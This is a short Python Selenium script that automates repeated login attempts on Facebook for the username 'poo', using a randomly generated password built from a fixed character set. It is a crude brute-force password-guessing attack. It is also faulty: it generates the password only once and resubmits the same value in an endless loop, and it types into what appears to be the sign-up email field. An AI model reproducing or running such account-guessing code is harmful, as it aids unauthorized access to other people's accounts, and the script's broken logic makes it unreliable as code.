from selenium import webdriver
from random import *
import time
import string

username = "poo"
characters = "fphinsRrUus201836"
password =  "".join(choice(characters) for x in range(randint(13, 16)))
actualforce = ("Dol"+password)

url = "https://www.facebook.com/"

driver = webdriver.Chrome("/home/anonymas/Downloads/chromedriver")
driver.get(url)

driver.find_element_by_id("email").send_keys(username)

driver.find_element_by_name("reg_email__").send_keys(actualforce)

driver.find_element_by_id("u_0_2").click()

while True:
    driver.find_element_by_id("reg_email__").send_keys(actualforce)
    driver.find_element_by_id("u_0_2").click()
